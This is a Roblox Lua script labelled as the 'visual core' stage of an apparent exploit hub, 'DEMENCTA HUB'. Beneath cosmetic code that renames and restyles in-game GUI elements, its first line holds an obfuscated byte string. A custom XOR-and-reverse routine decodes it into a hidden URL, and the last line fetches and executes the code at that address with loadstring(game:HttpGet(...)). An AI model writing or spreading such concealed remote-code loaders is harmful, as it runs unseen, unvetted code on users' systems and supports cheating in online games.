
--[[ STAGE 2: VISUAL CORE ]]
local gKl9QNYXRb5Uboek2dcO="\019\041\036\236\255\007\054\056\021\072\078\085\085\097\101\120\135\135\109\131\084\088\107\100\118\184\169\176\207\166\193\205\225\226\243\210\229\185\241\015\006\008\023\032\031\038\021\043\033\040\057\087\090\081\102\093\096\116\131\093\117\129\149\137\151\162\163\144\165\199\187\164\141\208\215\209\231\175\236\246\243\015\005\007\019\028\022\235\032\059\058\049\071\065\083\073\094\103\106\051\119\127\117\068\144\144\147\166\166\175\165\184\183\203\211\192\223\214\228\225\229\176\001\241\010\207\209\224\033\038\044\054\044"local nTk1GnorfkObwF_=131 local zYALQz_vb0DBTdnl1=16 local oJ_ZXnBDXYeOFGusu=1 local p8jZawJILxNeC8q2OPagf3=6 local dLlqFcGxvz024EsiGX=25 local BWkgUL6dyK_zkpry=true local G5fnjNOchIUD6hkb=bit32 and bit32.bxor if not G5fnjNOchIUD6hkb then G5fnjNOchIUD6hkb=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local gh8H1MIYi8x5HZr={}for kyUcjgRltbCvA=1,#gKl9QNYXRb5Uboek2dcO do local hgHJYm0k9S6qny4sY=string.byte(gKl9QNYXRb5Uboek2dcO,kyUcjgRltbCvA)local r2ZCjaGXAXa0id9G7WMrBw=(zYALQz_vb0DBTdnl1+(kyUcjgRltbCvA*p8jZawJILxNeC8q2OPagf3)+dLlqFcGxvz024EsiGX)%256 if oJ_ZXnBDXYeOFGusu==0 then hgHJYm0k9S6qny4sY=(hgHJYm0k9S6qny4sY-r2ZCjaGXAXa0id9G7WMrBw)%256 gh8H1MIYi8x5HZr[kyUcjgRltbCvA]=string.char(G5fnjNOchIUD6hkb(hgHJYm0k9S6qny4sY,nTk1GnorfkObwF_))else hgHJYm0k9S6qny4sY=G5fnjNOchIUD6hkb(hgHJYm0k9S6qny4sY,nTk1GnorfkObwF_)gh8H1MIYi8x5HZr[kyUcjgRltbCvA]=string.char((hgHJYm0k9S6qny4sY-r2ZCjaGXAXa0id9G7WMrBw)%256)end end local rowIlj1f6VSjF9VXtlU6d=table.concat(gh8H1MIYi8x5HZr)if BWkgUL6dyK_zkpry then rowIlj1f6VSjF9VXtlU6d=string.reverse(rowIlj1f6VSjF9VXtlU6d)end local ZKcJ0yVLcJYz=rowIlj1f6VSjF9VXtlU6d
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ZKcJ0yVLcJYz))()
